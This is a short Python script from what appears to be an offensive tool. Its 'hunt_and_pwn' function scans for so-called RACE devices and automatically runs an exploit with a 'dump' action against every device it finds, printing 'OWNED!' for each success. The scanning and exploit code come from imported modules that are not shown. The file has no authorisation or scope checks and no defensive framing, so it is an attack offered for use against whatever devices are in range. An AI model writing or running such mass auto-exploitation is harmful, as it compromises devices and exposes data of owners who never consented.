import asyncio
from modules.discovery import aggressive_scan
from modules.exploit import auto_exploit
from colorama import Fore, Style

async def hunt_and_pwn(timeout: int = 20):
    """Automatically find and exploit RACE devices"""
    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.RED}  AUTO-HUNTER: Finding and pwning RACE devices{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
    
    devices = await aggressive_scan(timeout)
    
    if not devices:
        print(f"{Fore.RED}[-] No RACE devices found{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[+] Found {len(devices)} RACE device(s){Style.RESET_ALL}")
    
    for dev in devices:
        print(f"\n{Fore.YELLOW}[*] Exploiting {dev['address']}...{Style.RESET_ALL}")
        result = await auto_exploit(dev['address'], "dump")
        
        if result['status'] == 'success':
            print(f"{Fore.GREEN}[+] {dev['address']} OWNED!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] {dev['address']} failed: {result.get('message', '')}{Style.RESET_ALL}")
